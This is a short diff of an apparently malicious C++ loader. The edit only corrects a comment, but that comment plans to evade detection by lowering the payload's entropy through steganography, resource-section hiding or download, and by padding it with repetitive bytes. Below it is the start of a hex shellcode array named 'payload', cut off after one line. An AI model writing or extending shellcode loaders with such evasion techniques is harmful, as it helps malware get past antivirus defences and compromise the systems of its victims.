@@ -3,7 +3,7 @@
 #include <ctime>
 #include <iostream>
 
-// todo:reduce entropy of thi by using steganography to hide in file, 
+// todo:reduce entropy of the payload by using steganography to hide in file, 
 // resource section or download and pad payload with repetitive bytes 
 unsigned char payload[] =
 "\x48\x31\xc9\x48\x81\xe9\xac\xff\xff\xff\x48\x8d\x05\xef"
